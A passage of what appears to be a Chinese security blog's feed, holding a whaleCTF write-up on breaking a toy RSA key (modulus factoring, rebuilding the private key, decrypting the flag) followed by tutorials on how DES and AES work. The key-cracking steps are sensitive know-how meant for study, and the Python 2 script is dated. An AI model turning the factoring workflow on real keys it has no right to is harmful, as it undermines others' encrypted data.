class="headerlink" title="whaleCTF:"></a><strong>whaleCTF:</strong></h2><h3 id="1，密钥生成："><a href="#1，密钥生成：" class="headerlink" title="1，密钥生成："></a><strong>1，密钥生成：</strong></h3><p>题目：</p><p>p=473398607161，q=4511491，e=17求解出d</p><p>利用工具：</p><p><img src="https://i.loli.net/2021/03/18/rh6lpGmgYZHn8Wy.png" alt="img"></p><h3 id="2，RSA解密："><a href="#2，RSA解密：" class="headerlink" title="2，RSA解密："></a><strong>2，RSA解密：</strong></h3><p><strong>ZIP伪加密：</strong></p><ol><li>手动修改：</li></ol><p><img src="https://i.loli.net/2021/03/18/9hX6ykNoFLVJpPC.png" alt="img"></p><ol><li>ZipCenOp.jar：</li></ol><p>注：使用前先备份</p><p><img src="https://i.loli.net/2021/03/18/8dZ1FVIj7kPhscw.png" alt="img"></p><p>利用kali中的openssl：</p><p><img src="https://i.loli.net/2021/03/18/MwPlC8mfAihE4X3.png" alt="img"></p><p><img src="https://i.loli.net/2021/03/18/A6WOHfC3PmsJc9L.png" alt="img"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -decrypt -<span class="keyword">in</span> 要解密的文件 -inkey 密钥 -out 输出文件</span><br></pre></td></tr></table></figure><h3 id="3，RSA破解"><a href="#3，RSA破解" class="headerlink" title="3，RSA破解"></a><strong>3，RSA破解</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#模数分解： </span></span><br><span class="line">openssl rsa -pubin -text -modulus -<span class="keyword">in</span> 密钥文件 </span><br><span class="line">openssl rsa -pubin -text -modulus -<span class="keyword">in</span> public.pem</span><br></pre></td></tr></table></figure><ol><li>只给出一个公钥文件和密文，我们要利用这两个文件解密</li><li>首先利用 openssl 解出公钥文件中的模数：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsa -pubin -text -modulus -<span class="keyword">in</span> public.pem</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/18/H4eJZgKdT5Ei9Sh.png" alt="img"></p><ol><li>再进行模数分解，得出 p 和 q （msiexe153.exe）</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msieve153.exe 0xCA00F5ED7B33B9BD421E77318AA178E75DEDE3CB1BC7D47A7D143BE7491C9025 -v</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/18/XgIclW5FHUPdo82.png" alt="img"></p><ol><li>再生成一个模板的私钥文件，利用py脚本：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">keypair = RSA.generate(<span class="number">1024</span>)<span class="comment">#公钥的长度</span></span><br><span class="line"></span><br><span class="line">keypair.p = <span class="number">290579950064240059571837821251441436997</span></span><br><span class="line">keypair.q = <span class="number">314436328879392457343835667929324128609</span></span><br><span class="line">keypair.e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">keypair.n = keypair.p * keypair.q</span><br><span class="line">Qn = long((keypair.p<span class="number">-1</span>) * (keypair.q<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">True</span>):</span><br><span class="line">    x = (Qn * i ) + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> (x % keypair.e == <span class="number">0</span>):</span><br><span class="line">        keypair.d = x / keypair.e</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">private = open(<span class="string">'private.pem'</span>,<span class="string">'w'</span>)</span><br><span class="line">private.write(keypair.exportKey())</span><br><span class="line">private.close()</span><br></pre></td></tr></table></figure><p>这个脚本最好在kali上运行，kali上有自带的库</p><p><img src="https://i.loli.net/2021/03/18/dygrDbAO7n6z8Xv.png" alt="img"></p><p>生成一个私钥文件：</p><p><img src="https://i.loli.net/2021/03/18/Fb4cWTgC6Qd8YrH.png" alt="img"></p><p><strong>注：</strong>也可以用一个工具RSAtool.py，可以直接输入p和q，再进行生成一个私钥文件：</p><p>在kali上运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python rsatool.py -p 290579950064240059571837821251441436997 -q 314436328879392457343835667929324128609 -e 65537 -o pri.pem -f PEM</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/18/BJM3bLikl9aXoQc.png" alt="img"></p><ol><li>用私钥解密flag文件：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -decrypt -<span class="keyword">in</span> flag.enc -inkey private.pem -out flag.txt</span><br></pre></td></tr></table></figure><h2 id="oppenSSL简介："><a href="#oppenSSL简介：" class="headerlink" title="oppenSSL简介："></a><strong>oppenSSL简介：</strong></h2><p><img src="https://i.loli.net/2021/03/18/CtFEkKjbSrVD9gG.png" alt="img"></p><p><img src="https://i.loli.net/2021/03/18/WyfdAbZ7QaNjC6E.png" alt="img"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;RSA&lt;/p&gt;
    
    </summary>
    
    
      <category term="密码学" scheme="http://goudanjun.vip/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
      <category term="RSA" scheme="http://goudanjun.vip/tags/RSA/"/>
    
  </entry>
  
  <entry>
    <title>DES加密</title>
    <link href="http://goudanjun.vip/2021/03/16/DES%E5%8A%A0%E5%AF%86.html/"/>
    <id>http://goudanjun.vip/2021/03/16/DES加密.html/</id>
    <published>2021-03-16T09:21:59.000Z</published>
    <updated>2021-03-20T02:18:31.405Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DES算法简介"><a href="#DES算法简介" class="headerlink" title="DES算法简介"></a>DES算法简介</h1><p>DES全称为Data Encryption Standard，即数据加密标准，是一种使用<a href="https://baike.baidu.com/item/密钥加密/5928903" target="_blank" rel="noopener">密钥加密</a>的块算法，1977年被<a href="https://baike.baidu.com/item/美国联邦政府/8370227" target="_blank" rel="noopener">美国联邦政府</a>的国家标准局确定为<a href="https://baike.baidu.com/item/联邦资料处理标准/3940777" target="_blank" rel="noopener">联邦资料处理标准</a>（FIPS），并授权在非密级政府通信中使用，随后该算法在国际上广泛流传开来。需要注意的是，在某些文献中，作为算法的DES称为数据加密算法（Data Encryption Algorithm,DEA），已与作为标准的DES区分开来。不过已经发现DES容易受到非常强大的攻击，因此DES的普及程度略有下降。</p><a id="more"></a><p>DES是一个分组加密算法，典型的DES以64位为分组对数据加密，加密和解密用的是同一个算法。</p><p>密钥长64位，密钥事实上是56位参与DES运算（第8、16、24、32、40、48、56、64位是校验位，使得每个密钥都有奇数个1），分组后的明文组和56位的密钥按位替代或交换的方法形成密文组。</p><h2 id="DES算法流程图："><a href="#DES算法流程图：" class="headerlink" title="DES算法流程图："></a>DES算法流程图：</h2><p><img src="https://i.loli.net/2021/03/17/WLG3oqrX4bmRgy5.jpg" alt="9ceb6132a8746dadf212e28006a379e5"></p><h1 id="初始置换"><a href="#初始置换" class="headerlink" title="初始置换"></a>初始置换</h1><p>利用IP表对数据进行换位处理，打乱原来的顺序，得到一个乱序的 64bit 明文组</p><p><img src="https://i.loli.net/2021/03/17/rsfqPlJX9OSCL6c.png" alt="image-20210317164118103"></p><p><strong>IP表的意思为：将X中的58位数据放在转换后生成的X’表的第1位，X中的第50位放在X’的第2位，X中的42位放在第3位…X中的第7位放在X’的最后一位。</strong></p><p>例如，初始X为：01010011 01100101 01100011 01110010 01100101 01110100 00100000 01001101</p><p>则经过初始置换IP表进行置换后 变成：10111111 00101001 10110010 10010111 00000000 01111110 10000000 00001101 。</p><p>进行完IP置换后，将X分成左右两部分，左边记为L0，右边记为R0:</p><p>L0 = 10111111 00101001 10110010 10010111</p><p>R0 = 00000000 01111110 10000000 00001101</p><p>然后进入轮函数。</p><h1 id="轮函数"><a href="#轮函数" class="headerlink" title="轮函数"></a>轮函数</h1><p>轮函数即 f() ，运算如图：</p><p><img src="https://i.loli.net/2021/03/17/ZLbxIhqEr5CDdil.jpg" alt="f2c85cfd21751719a294355ae253eaad"></p><ol><li><p>根据位选择函数 E 将 R 扩展到 48bit：</p><p><img src="https://i.loli.net/2021/03/17/7WknYmMIRSAF5Bl.png" alt="image-20210317173021447"></p></li><li><p>与子密钥K进行异或操作</p></li><li><p>S盒代换</p><p>将 E(A) 和 K 进行异或操作后，把比特串分为8组，一组 6 bit，分别对每一组进行S盒代换。经过S盒，每一组由 6 bit 缩减为 4 bit。</p><p>S盒的行号从0到3，列号从0到15。</p><p>代换的过程如下，例如需要代换的第一组数据输入为011001，则第一位0和最后一位1组合成的01即为行号，中间的1101为列号，第一组数据对应S1，01转化成10进制为1，1101转化成10进制为13，因此S1中的第1行第13列就为对应的输出，查表得5，转化成2进制为0101。因此0101就为最终的4位输出。</p><p><img src="https://i.loli.net/2021/03/17/tSMVUCaD6K2E9uW.png" alt="image-20210317173255986"></p></li><li><p>P盒代换</p><p>P为固定置换，将经过S盒变换得到的32 bit进行一个置换操作。</p><p><img src="https://i.loli.net/2021/03/17/WeKtsHVBq7CAbQ4.png" alt="image-20210317173346417"></p><p>至此得到 f函数 的最终输出</p></li></ol><h1 id="子密钥"><a href="#子密钥" class="headerlink" title="子密钥"></a>子密钥</h1><p>在DES中，加密者输入的明文和密钥都是64 bit，其中只有56 bit是有用的位数（因为有8位为奇偶校验位，每7位数据有一位奇偶校验位）。但是DES加密过程有16轮循环函数，其中需要用到16个密钥，所以要将这56 bit扩展生成16个48 bit 的子密钥。步骤如下：</p><h2 id="用pc-1表置换"><a href="#用pc-1表置换" class="headerlink" title="用pc-1表置换"></a>用pc-1表置换</h2><p><img src="https://i.loli.net/2021/03/17/p9I7TSyK2qnmQJe.png" alt="image-20210317174200211"></p><p>PC_1置换的主要步骤和初始IP置换一样，PC_1置换的目的是为了去掉64 bit 密钥k 中的8个奇偶校验位，并对其余56位打乱排列。置换完成后，同样将密钥分成左右两部分各28 bit，左边为C0, 右边为D0。</p><p>例如：原始**:K=00010011 00110100 01010111 01111001 10011011 10111100 11011111 11110001</p><p>经过PC_1置换后:K=1111000 0110011 0010101 0101111 0101010 1011001 1001111 0001111</p><p>分成左右两部分C0和D0：</p><p>C0= 1111000 0110011 0010101 0101111</p><p>D0= 0101010 1011001 1001111 0001111</p><h2 id="创建16个块Cn和Dn"><a href="#创建16个块Cn和Dn" class="headerlink" title="创建16个块Cn和Dn"></a>创建16个块Cn和Dn</h2><p>当 1&lt;=n&lt;=16 时，在第n轮分别对Cn-1和Dn-1进行循环左移，所移的位数为1位或者2位，取决于n的值，当n=1,2,9,16时左移1位，其它左移2位。因此表格如下：</p><p><img src="https://i.loli.net/2021/03/17/AtDMgyGpYEiRPo2.png" alt="image-20210317180930070"></p><h2 id="得到16个子密钥"><a href="#得到16个子密钥" class="headerlink" title="得到16个子密钥"></a>得到16个子密钥</h2><p><img src="https://i.loli.net/2021/03/17/uw3RqjKcI8osSB9.png" alt="image-20210317181307582"></p><p>Kn = PC_2(CnDn)，PC_2为固定置换，用于从 CnDn 中选取48 bit作为子密钥 Kn，CnDn 表示从左到右将 Dn 排在 Cn 的后面，CnDn 的长度为56 bit。</p><p>至此，子密钥全部生成</p><h1 id="逆初始置换IP-1"><a href="#逆初始置换IP-1" class="headerlink" title="逆初始置换IP-1"></a>逆初始置换IP-1</h1><p><img src="https://i.loli.net/2021/03/17/Kcg567NVpYTChBZ.png" alt="image-20210317181422209"></p><p>轮函数最后一步的左边32 bit和右边32 bit合成64 bit，再进行逆初始置换，得到最终密文</p><h1 id="DES解密"><a href="#DES解密" class="headerlink" title="DES解密"></a>DES解密</h1><p>DES的解密过程与加密过程相同，只不过在16次迭代中使用子密钥的次序正好相反。解密时，第1次迭代使用子密钥K16，第2次使用子密钥K15，以此类推…，第16次使用子密钥K1。</p><h1 id="其他相关"><a href="#其他相关" class="headerlink" title="其他相关"></a>其他相关</h1><h2 id="三重DES"><a href="#三重DES" class="headerlink" title="三重DES"></a>三重DES</h2><p>DES的密钥长度被证明已经不能满足当前安全的要求，为了增强DES安全性，人们开始提出针对DES的各种改进方案，一种简单的方法就是使用多重DES，其中三重DES应用最广泛。三重DES就是使用3次DES运算，密钥长度增加到112 bit或168 bit，可以有效克服DES面临的穷举攻击，但实现速度更慢。因此，三重DES只是在DES变得不安全的情况下一种临时解决方案。</p><h2 id="数据补位"><a href="#数据补位" class="headerlink" title="数据补位"></a>数据补位</h2><p>为什么要进行数据补位？主要原因是DES算法加解密时要求数据必须为8个字节。</p><p>DES数据加解密就是将数据按照8个字节一段进行DES加密或解密得到一段8个字节的密文或者明文，最后一段不足8个字节，按照需求补足8个字节（通常补00或者FF，根据实际要求不同）进行计算，之后按照顺序将计算所得的数据连在一起即可。</p><p>很多地方默认的补位方式是以PKCS7补位的，如果C#默认的就是PKCS7补位：补位补到8位的整数倍，差几位补几。</p><h2 id="DES两种加密模式"><a href="#DES两种加密模式" class="headerlink" title="DES两种加密模式"></a>DES两种加密模式</h2><h3 id="ECB模式"><a href="#ECB模式" class="headerlink" title="ECB模式"></a>ECB模式</h3><p>DES ECB（电子密本方式）其实非常简单，就是将数据按照8个字节一段进行DES加密或解密得到一段8个字节的密文或者明文，最后一段不足8个字节，按照需求补足8个字节进行计算，之后按照顺序将计算所得的数据连在一起即可，各段数据之间互不影响。</p><h3 id="CBC模式"><a href="#CBC模式" class="headerlink" title="CBC模式"></a>CBC模式</h3><p>DES CBC（密文分组链接方式）有点麻烦，它的实现机制使加密的各段数据之间有了联系。其实现的机理如下：</p><p>加密步骤如下：</p><p>1）首先将数据按照8个字节一组进行分组得到D1D2……Dn（若数据不是8的整数倍，用指定的PADDING数据补位）</p><p>2）第一组数据D1与初始化向量I异或后的结果进行DES加密得到第一组密文C1（初始化向量I为全零）</p><p>3）第二组数据D2与第一组的加密结果C1异或以后的结果进行DES加密，得到第二组密文C2</p><p>4）之后的数据以此类推，得到Cn</p><p>5）按顺序连为C1C2C3……Cn即为加密结果。</p><p>解密是加密的逆过程，步骤如下：</p><p>1）首先将数据按照8个字节一组进行分组得到C1C2C3……Cn</p><p>2）将第一组数据进行<strong>解密后与初始化向量I进行</strong>异或得到第一组明文D1（注意：一定是先解密再异或）</p><p>3）将第二组数据C2进行<strong>解密后与第一组密文数据进行</strong>异或得到第二组数据D2</p><p>4）之后依此类推，得到Dn</p><p>5）按顺序连为D1D2D3……Dn即为解密结果。</p><p>参考文章</p><p><a href="https://www.pianshen.com/article/72001148423/" target="_blank" rel="noopener">https://www.pianshen.com/article/72001148423/</a></p><p><a href="https://en.wikipedia.org/wiki/DES_supplementary_material" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/DES_supplementary_material</a></p><p><a href="https://blog.csdn.net/xiamu610/article/details/78344263" target="_blank" rel="noopener">https://blog.csdn.net/xiamu610/article/details/78344263</a></p><p><a href="https://www.bilibili.com/video/BV1QW411B7A4?from=search&amp;seid=8007804670248774790" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1QW411B7A4?from=search&amp;seid=8007804670248774790</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;DES算法简介&quot;&gt;&lt;a href=&quot;#DES算法简介&quot; class=&quot;headerlink&quot; title=&quot;DES算法简介&quot;&gt;&lt;/a&gt;DES算法简介&lt;/h1&gt;&lt;p&gt;DES全称为Data Encryption Standard，即数据加密标准，是一种使用&lt;a href=&quot;https://baike.baidu.com/item/密钥加密/5928903&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;密钥加密&lt;/a&gt;的块算法，1977年被&lt;a href=&quot;https://baike.baidu.com/item/美国联邦政府/8370227&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;美国联邦政府&lt;/a&gt;的国家标准局确定为&lt;a href=&quot;https://baike.baidu.com/item/联邦资料处理标准/3940777&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;联邦资料处理标准&lt;/a&gt;（FIPS），并授权在非密级政府通信中使用，随后该算法在国际上广泛流传开来。需要注意的是，在某些文献中，作为算法的DES称为数据加密算法（Data Encryption Algorithm,DEA），已与作为标准的DES区分开来。不过已经发现DES容易受到非常强大的攻击，因此DES的普及程度略有下降。&lt;/p&gt;
    
    </summary>
    
    
      <category term="DES" scheme="http://goudanjun.vip/tags/DES/"/>
    
      <category term="密码学" scheme="http://goudanjun.vip/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>AES加密</title>
    <link href="http://goudanjun.vip/2021/03/15/AES%E5%8A%A0%E5%AF%86.html/"/>
    <id>http://goudanjun.vip/2021/03/15/AES加密.html/</id>
    <published>2021-03-15T07:36:18.000Z</published>
    <updated>2021-03-20T02:18:21.320Z</updated>
    
    <content type="html"><![CDATA[<h1 id="AES加密简介"><a href="#AES加密简介" class="headerlink" title="AES加密简介"></a>AES加密简介</h1><p>高级加密标准(AES,Advanced Encryption Standard)为最常见的<strong>对称加密算法</strong>(微信小程序加密传输就是用这个加密算法的)。</p><a id="more"></a><p>对称加密算法也就是加密和解密用相同的密钥，具体的加密流程如下图：</p><p><img src="https://i.loli.net/2021/03/15/Gdi4zT2KFLkxcIO.png" alt="aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwMjE5MDgyOTA5Njg4"></p><p>设AES加密函数为E，则 C = E(K, P),其中P为明文，K为密钥，C为密文。也就是说，把明文P和密钥K作为加密函数的参数输入，则加密函数E会输出密文C。</p><p>设AES解密函数为D，则 P = D(K, C),其中C为密文，K为密钥，P为明文。也就是说，把密文C和密钥K作为解密函数的参数输入，则解密函数会输出明文P。</p><h2 id="AES的五种加密模式"><a href="#AES的五种加密模式" class="headerlink" title="AES的五种加密模式"></a>AES的五种加密模式</h2><h3 id="ECB"><a href="#ECB" class="headerlink" title="ECB"></a>ECB</h3><p>将明文分成若干相同的小段，并对每一小段进行加密</p><h3 id="CBC"><a href="#CBC" class="headerlink" title="CBC"></a>CBC</h3><p>将明文切分成若干小段，然后每一小段与初始块或者上一段的密文段进行异或运算后，再与密钥进行加密。</p><p><img src="https://i.loli.net/2021/03/16/jTWyhB87a9uk512.png" alt="12232506-27faefa42fde42d28bef168b20736a61"></p><h3 id="CTR"><a href="#CTR" class="headerlink" title="CTR"></a>CTR</h3><p>在CTR模式中， 有一个自增的算子，这个算子用密钥加密之后的输出和明文异或的结果得到密文，相当于一次一密。这种加密方式简单快速，安全可靠，而且可以并行加密，但是在计算器不能维持很长的情况下，密钥只能使用一次。</p><p><img src="https://i.loli.net/2021/03/16/ZfFoPThA4jd3BGa.png" alt="12232517-b33f83764ff249d9b1d8bb236baa20e0"></p><h3 id="CFB"><a href="#CFB" class="headerlink" title="CFB"></a>CFB</h3><p><img src="https://i.loli.net/2021/03/16/4ZuULWrABYHQdJK.png" alt="12232528-c5c4946255a849379be143aaca8d1ecf"></p><h3 id="OFB"><a href="#OFB" class="headerlink" title="OFB"></a>OFB</h3><p><img src="https://i.loli.net/2021/03/16/vMam286ITSgdGWO.png" alt="12232542-349b69872d274aa797cee9ef848a550e"></p><h1 id="ECB加密详解"><a href="#ECB加密详解" class="headerlink" title="ECB加密详解"></a>ECB加密详解</h1><p>AES为分组密码，分组密码也就是把明文分成一组一组的，每组长度相等，每次加密一组数据，直到加密完整个明文。在AES标准规范中，分组长度只能是128位，也就是说，每个分组为16个字节（每个字节8位）。密钥的长度可以使用128位、192位或256位。密钥的长度不同，推荐加密轮数也不同，如下表所示：</p><table><thead><tr><th>AES</th><th>密钥长度（32位比特字)</th><th>分组长度(32位比特字)</th><th>加密轮数</th></tr></thead><tbody><tr><td>AES-128</td><td>4</td><td>4</td><td>10</td></tr><tr><td>AES-192</td><td>6</td><td>4</td><td>12</td></tr><tr><td>AES-256</td><td>8</td><td>4</td><td>14</td></tr></tbody></table><p>轮数在下面介绍，这里实现的是AES-128，也就是密钥的长度为128位，加密轮数为10轮。<br>上面说到，AES的加密公式为C = E(K,P)，在加密函数E中，会执行一个轮函数，并且执行10次这个轮函数，这个轮函数的前9次执行的操作是一样的，只有第10次有所不同。也就是说，一个明文分组会被加密10轮。AES的核心就是实现一轮中的所有操作。</p><p>AES的处理单位是字节，128位的输入明文分组P和输入密钥K都被分成16个字节，分别记为P = P0 P1 … P15 和 K = K0 K1 … K15。如，明文分组为P = abcdefghijklmnop,其中的字符a对应P0，p对应P15。一般地，明文分组用字节为单位的正方形矩阵描述，称为状态矩阵。在算法的每一轮中，状态矩阵的内容不断发生变化，最后的结果作为密文输出。该矩阵中字节的排列顺序为从上到下、从左至右依次排列，如下图所示：</p><p><img src="https://i.loli.net/2021/03/16/Nnf4tZhzLOu8Yml.png" alt="aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwMjE5MTMyNTQ4OTA2"></p><p>现在假设明文分组P为”abcdefghijklmnop”，则对应上面生成的状态矩阵图如下：</p><p><img src="https://i.loli.net/2021/03/16/kHFJRf7qdTgyM2G.png" alt="aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwMjE5MTM0NzIyODEy"></p><p>上图中，0x61为字符a的十六进制表示。可以看到，明文经过AES加密后，已经面目全非。</p><p>类似地，128位密钥也是用字节为单位的矩阵表示，矩阵的每一列被称为1个32位比特字。通过密钥编排函数该密钥矩阵被扩展成一个44个字组成的序列W[0],W[1], … ,W[43],该序列的前4个元素W[0],W[1],W[2],W[3]是原始密钥，用于加密运算中的初始密钥加（下面介绍）;后面40个字分为10组，每组4个字（128比特）分别用于10轮加密运算中的轮密钥加，如下图所示：</p><p><img src="https://i.loli.net/2021/03/16/4LUOCelbpgDmi9d.jpg" alt="aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwMjE5MTUyNjM4MzI0"></p><p>上图中，设K = “abcdefghijklmnop”，则K0 = a, K15 = p, W[0] = K0 K1 K2 K3 = “abcd”。</p><p>AES的整体结构如下图所示，其中的W[0,3]是指W[0]、W[1]、W[2]和W[3]串联组成的128位密钥。加密的第1轮到第9轮的轮函数一样，包括4个操作：字节代换、行位移、列混合和轮密钥加。最后一轮迭代不执行列混合。另外，在第一轮迭代之前，先将明文和原始密钥进行一次异或加密操作。</p><p><img src="https://i.loli.net/2021/03/16/kRmDf6EIrtVNJqG.jpg" alt="aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwMjE5MTYxMjAyNDg1"></p><p>上图也展示了AES解密过程，解密过程仍为10轮，每一轮的操作是加密操作的逆操作。由于AES的4个轮操作都是可逆的，因此，解密操作的一轮就是顺序执行逆行移位、逆字节代换、轮密钥加和逆列混合。同加密操作类似，最后一轮不执行逆列混合，在第1轮解密之前，要执行1次密钥加操作。</p><p>这里当加密的首尾都有密钥参与的时候增加了算法的安全性。</p><h2 id="字节代换"><a href="#字节代换" class="headerlink" title="字节代换"></a>字节代换</h2><h3 id="字节代换操作"><a href="#字节代换操作" class="headerlink" title="字节代换操作"></a>字节代换操作</h3><p>这里定义了S盒：</p><table><thead><tr><th>行/列</th><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>A</th><th>B</th><th>C</th><th>D</th><th>E</th><th>F</th></tr></thead><tbody><tr><td>0</td><td>0x63</td><td>0x7c</td><td>0x77</td><td>0x7b</td><td>0xf2</td><td>0x6b</td><td>0x6f</td><td>0xc5</td><td>0x30</td><td>0x01</td><td>0x67</td><td>0x2b</td><td>0xfe</td><td>0xd7</td><td>0xab</td><td>0x76</td></tr><tr><td>1</td><td>0xca</td><td>0x82</td><td>0xc9</td><td>0x7d</td><td>0xfa</td><td>0x59</td><td>0x47</td><td>0xf0</td><td>0xad</td><td>0xd4</td><td>0xa2</td><td>0xaf</td><td>0x9c</td><td>0xa4</td><td>0x72</td><td>0xc0</td></tr><tr><td>2</td><td>0xb7</td><td>0xfd</td><td>0x93</td><td>0x26</td><td>0x36</td><td>0x3f</td><td>0xf7</td><td>0xcc</td><td>0x34</td><td>0xa5</td><td>0xe5</td><td>0xf1</td><td>0x71</td><td>0xd8</td><td>0x31</td><td>0x15</td></tr><tr><td>3</td><td>0x04</td><td>0xc7</td><td>0x23</td><td>0xc3</td><td>0x18</td><td>0x96</td><td>0x05</td><td>0x9a</td><td>0x07</td><td>0x12</td><td>0x80</td><td>0xe2</td><td>0xeb</td><td>0x27</td><td>0xb2</td><td>0x75</td></tr><tr><td>4</td><td>0x09</td><td>0x83</td><td>0x2c</td><td>0x1a</td><td>0x1b</td><td>0x6e</td><td>0x5a</td><td>0xa0</td><td>0x52</td><td>0x3b</td><td>0xd6</td><td>0xb3</td><td>0x29</td><td>0xe3</td><td>0x2f</td><td>0x84</td></tr><tr><td>5</td><td>0x53</td><td>0xd1</td><td>0x00</td><td>0xed</td><td>0x20</td><td>0xfc</td><td>0xb1</td><td>0x5b</td><td>0x6a</td><td>0xcb</td><td>0xbe</td><td>0x39</td><td>0x4a</td><td>0x4c</td><td>0x58</td><td>0xcf</td></tr><tr><td>6</td><td>0xd0</td><td>0xef</td><td>0xaa</td><td>0xfb</td><td>0x43</td><td>0x4d</td><td>0x33</td><td>0x85</td><td>0x45</td><td>0xf9</td><td>0x02</td><td>0x7f</td><td>0x50</td><td>0x3c</td><td>0x9f</td><td>0xa8</td></tr><tr><td>7</td><td>0x51</td><td>0xa3</td><td>0x40</td><td>0x8f</td><td>0x92</td><td>0x9d</td><td>0x38</td><td>0xf5</td><td>0xbc</td><td>0xb6</td><td>0xda</td><td>0x21</td><td>0x10</td><td>0xff</td><td>0xf3</td><td>0xd2</td></tr><tr><td>8</td><td>0xcd</td><td>0x0c</td><td>0x13</td><td>0xec</td><td>0x5f</td><td>0x97</td><td>0x44</td><td>0x17</td><td>0xc4</td><td>0xa7</td><td>0x7e</td><td>0x3d</td><td>0x64</td><td>0x5d</td><td>0x19</td><td>0x73</td></tr><tr><td>9</td><td>0x60</td><td>0x81</td><td>0x4f</td><td>0xdc</td><td>0x22</td><td>0x2a</td><td>0x90</td><td>0x88</td><td>0x46</td><td>0xee</td><td>0xb8</td><td>0x14</td><td>0xde</td><td>0x5e</td><td>0x0b</td><td>0xdb</td></tr><tr><td>A</td><td>0xe0</td><td>0x32</td><td>0x3a</td><td>0x0a</td><td>0x49</td><td>0x06</td><td>0x24</td><td>0x5c</td><td>0xc2</td><td>0xd3</td><td>0xac</td><td>0x62</td><td>0x91</td><td>0x95</td><td>0xe4</td><td>0x79</td></tr><tr><td>B</td><td>0xe7</td><td>0xc8</td><td>0x37</td><td>0x6d</td><td>0x8d</td><td>0xd5</td><td>0x4e</td><td>0xa9</td><td>0x6c</td><td>0x56</td><td>0xf4</td><td>0xea</td><td>0x65</td><td>0x7a</td><td>0xae</td><td>0x08</td></tr><tr><td>C</td><td>0xba</td><td>0x78</td><td>0x25</td><td>0x2e</td><td>0x1c</td><td>0xa6</td><td>0xb4</td><td>0xc6</td><td>0xe8</td><td>0xdd</td><td>0x74</td><td>0x1f</td><td>0x4b</td><td>0xbd</td><td>0x8b</td><td>0x8a</td></tr><tr><td>D</td><td>0x70</td><td>0x3e</td><td>0xb5</td><td>0x66</td><td>0x48</td><td>0x03</td><td>0xf6</td><td>0x0e</td><td>0x61</td><td>0x35</td><td>0x57</td><td>0xb9</td><td>0x86</td><td>0xc1</td><td>0x1d</td><td>0x9e</td></tr><tr><td>E</td><td>0xe1</td><td>0xf8</td><td>0x98</td><td>0x11</td><td>0x69</td><td>0xd9</td><td>0x8e</td><td>0x94</td><td>0x9b</td><td>0x1e</td><td>0x87</td><td>0xe9</td><td>0xce</td><td>0x55</td><td>0x28</td><td>0xdf</td></tr><tr><td>F</td><td>0x8c</td><td>0xa1</td><td>0x89</td><td>0x0d</td><td>0xbf</td><td>0xe6</td><td>0x42</td><td>0x68</td><td>0x41</td><td>0x99</td><td>0x2d</td><td>0x0f</td><td>0xb0</td><td>0x54</td><td>0xbb</td><td>0x16</td></tr></tbody></table><p>状态矩阵中的元素按照下面的方式映射为一个新的字节：把该字节的高4位作为行值，低4位作为列值，取出S盒或者逆S盒中对应的行的元素作为输出。例如，加密时，输出的字节S1为0x12,则查S盒的第0x01行和0x02列，得到值0xc9,然后替换S1原有的0x12为0xc9。状态矩阵经字节代换后的图如下：<br><img src="https://i.loli.net/2021/03/16/GLYh5RmyIUz12Je.png" alt="字节变换"></p><h3 id="字节逆代换操作"><a href="#字节逆代换操作" class="headerlink" 